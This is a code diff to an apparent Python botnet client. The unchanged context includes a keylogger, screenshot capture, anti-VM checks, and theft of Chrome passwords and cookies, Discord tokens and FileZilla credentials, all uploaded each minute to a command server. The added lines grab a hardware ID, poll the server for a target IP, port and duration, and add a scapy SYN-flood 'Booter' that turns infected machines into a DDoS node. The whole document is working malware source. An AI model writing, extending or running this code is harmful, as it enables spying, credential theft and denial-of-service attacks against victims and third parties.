@@ -16,10 +16,12 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 import xml.etree.ElementTree as ET
 from pynput.keyboard import Key, Listener
+import scapy.all as scapy
 
 APP_DATA = os.environ['LOCALAPPDATA']
 API_URL = "http://localhost:4000"
 CONFIG_PATH = "config.txt"
+BOOT_CONFIG_PATH = "boot.txt"
 SCREENSHOT_PATH = "screenshot.jpg"
 LOG_PATH = "logs.txt"
 
@@ -68,6 +70,7 @@ class AntiVM():
 class ApiController():
     def __init__(self):
         self.api_url = API_URL
+        self.boot_config_path = BOOT_CONFIG_PATH
         self.screenshot_path = SCREENSHOT_PATH
         self.log_path = LOG_PATH
 
@@ -112,6 +115,12 @@ class ApiController():
             w_key = ""
             try:    
                 w_key = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
+            except:
+                pass
+                
+            hwid = ""
+            try:
+                hwid = os.popen("wmic csproduct get uuid")
             except:
                 pass
                 
@@ -184,6 +193,46 @@ class ApiController():
 
             requests.post(f"{self.api_url}/update/keylogger/{identifier}/{token}", files=post_file)
 
+    def check_boot(self, identifier, token):
+        if self.check_connection():
+            boot_data = requests.get(f"{self.api_url}/boot/{identifier}/{token}")
+
+            if boot_data.status_code == 200:
+                data = boot_data.json()
+                if os.path.isfile(self.boot_config_path):
+                    if isinstance(data, dict) and data["ip"] != None:
+
+                        if data["ip"] != None:
+
+                            f = open(self.boot_config_path, "r").read()
+                            if f != data["identifier"]:
+                                f = open(self.boot_config_path, "w+")
+                                f.write(data["identifier"])
+                                f.close()
+                                return data
+                            else:
+                                return False
+
+                        else:
+                            return False
+
+                    else:
+                        return False
+                        
+                else:
+                    if isinstance(data, dict):
+                        if data["ip"] != None:
+                            f = open(self.boot_config_path, "w+")
+                            f.write(data["identifier"])
+                            f.close()
+                            return data
+                        else:
+                            return False
+                    else:
+                        return False
+            else: 
+                return False
+
 class FileController():
     def __init__(self):
         self.config_path = CONFIG_PATH
@@ -198,12 +247,12 @@ class FileController():
         os.remove(filename)
 
     def save_creds(self, identifier, token):
-        f = open(self.config_path, 'w+')
-        f.write(f'{identifier}:{token}')
+        f = open(self.config_path, "w+")
+        f.write(f"{identifier}:{token}")
         f.close()
 
     def get_creds(self):
-        f = open(self.config_path, 'r').read()
+        f = open(self.config_path, "r").read()
         if ":" in f:
             l = f.split(":")
             return [l[0], l[1]]
@@ -227,8 +276,8 @@ class Chrome(object):
             0)[1]
 
     def locate_db(self):
-        full_path = os.path.join(APP_DATA, 'Google\\Chrome\\User Data\\Default\\Login Data')
-        temp_path = os.path.join(APP_DATA, 'sqlite_file')
+        full_path = os.path.join(APP_DATA, "Google\\Chrome\\User Data\\Default\\Login Data")
+        temp_path = os.path.join(APP_DATA, "sqlite_file")
         if os.path.exists(temp_path): 
             os.remove(temp_path)
         shutil.copyfile(full_path, temp_path)
@@ -279,8 +328,8 @@ class Cookies(object):
                     0)[1]
 
     def locate_db(self):
-        full_path = os.path.join(APP_DATA, 'Google\\Chrome\\User Data\\Default\\Cookies')
-        temp_path = os.path.join(APP_DATA,'sqlite_file')
+        full_path = os.path.join(APP_DATA, "Google\\Chrome\\User Data\\Default\\Cookies")
+        temp_path = os.path.join(APP_DATA,"sqlite_file")
         if os.path.exists(full_path): os.remove(temp_path)
         shutil.copyfile(full_path, temp_path)
         return full_path
@@ -325,16 +374,16 @@ class Discord():
 
     def discord(self):
         discordPaths = [
-            os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
-            os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
-            os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb'
+            os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
+            os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
+            os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb"
         ]
 
         for location in discordPaths:
             try:
                 if os.path.exists(location):
                     for file in os.listdir(location):
-                        with open(f"{location}\\{file}", errors='ignore') as _data:
+                        with open(f"{location}\\{file}", errors="ignore") as _data:
                             regex = re.findall(self.regex, _data.read())
                             if regex:
                                 for token in regex:
@@ -343,11 +392,11 @@ class Discord():
                 pass
 
     def chrome(self):
-        chromie = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
+        chromie = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
         try:
             if os.path.exists(chromie):
                 for file in os.listdir(chromie):
-                    with open(f"{chromie}\\{file}", errors='ignore') as _data:
+                    with open(f"{chromie}\\{file}", errors="ignore") as _data:
                         regex = re.findall(self.regex, _data.read())
                         if regex:
                             for token in regex:
@@ -376,16 +425,16 @@ class Filezilla(object):
             saved_pass_file = os.path.join(filezilla, "recentservers.xml")
             if os.path.exists(saved_pass_file):
                 xml_tree = ET.parse(saved_pass_file).getroot()
-                if xml_tree.findall('RecentServers/Server'):
-                    servers = xml_tree.findall('RecentServers/Server')
+                if xml_tree.findall("RecentServers/Server"):
+                    servers = xml_tree.findall("RecentServers/Server")
                 else:
-                    servers = xml_tree.findall('Servers/Server')
+                    servers = xml_tree.findall("Servers/Server")
  
                 for server in servers:
-                    host = server.find('Host')
-                    port = server.find('Port')
-                    user = server.find('User')
-                    password = server.find('Pass')
+                    host = server.find("Host")
+                    port = server.find("Port")
+                    user = server.find("User")
+                    password = server.find("Pass")
                     full_pass = base64.b64decode(password.text).decode()
                     self.saved.append({"host": host.text, "port": port.text, "user": user.text, "pass": full_pass})
 
@@ -421,6 +470,21 @@ class KeyLogger():
                 if ke.find("Key") == -1:
                     f.write(ke)
 
+class Booter():
+    def boot(self, boot_data):
+        if isinstance(boot_data, dict):
+            t_end = time.time() + 60 * int(boot_data["duration"])
+            while time.time() < t_end:
+                target_ip = boot_data["ip"]
+                target_port = int(boot_data["port"])
+
+                ip = scapy.IP(dst=target_ip)
+                tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
+                raw = scapy.Raw(b"X"*1024)
+                p = ip / tcp / raw
+
+                scapy.send(p, loop=0, verbose=0)
+
 def main():
     if(AntiVM().inVM()):
         exit()
@@ -447,13 +511,14 @@ def main():
                         listener = Listener(on_press=logger.on_press)
                         listener.start()
 
-                        schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
-                        schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
-                        schedule.every(1).minutes.do(api.update_logs, bot_identifier, bot_token)
-                        schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
-                        schedule.every(1).minutes.do(api.update_cookies, bot_identifier, bot_token, Cookies().dump())
-                        schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
-                        schedule.every(1).minutes.do(api.update_filezilla, bot_identifier, bot_token, Filezilla().dump())
+                        schedule.every(1).minutes.do(lambda: Booter().boot(api.check_boot(bot_identifier, bot_token)))
+                        schedule.every(1).minutes.do(lambda: api.update_details(bot_identifier, bot_token))
+                        schedule.every(1).minutes.do(lambda: api.update_screenshot(bot_identifier, bot_token))
+                        schedule.every(1).minutes.do(lambda: api.update_logs(bot_identifier, bot_token))
+                        schedule.every(1).minutes.do(lambda: api.update_chrome(bot_identifier, bot_token, Chrome().dump()))
+                        schedule.every(1).minutes.do(lambda: api.update_cookies(bot_identifier, bot_token, Cookies().dump()))
+                        schedule.every(1).minutes.do(lambda: api.update_discord(bot_identifier, bot_token, Discord().dump()))
+                        schedule.every(1).minutes.do(lambda: api.update_filezilla(bot_identifier, bot_token, Filezilla().dump()))
 
                         while True:
                             schedule.run_pending()
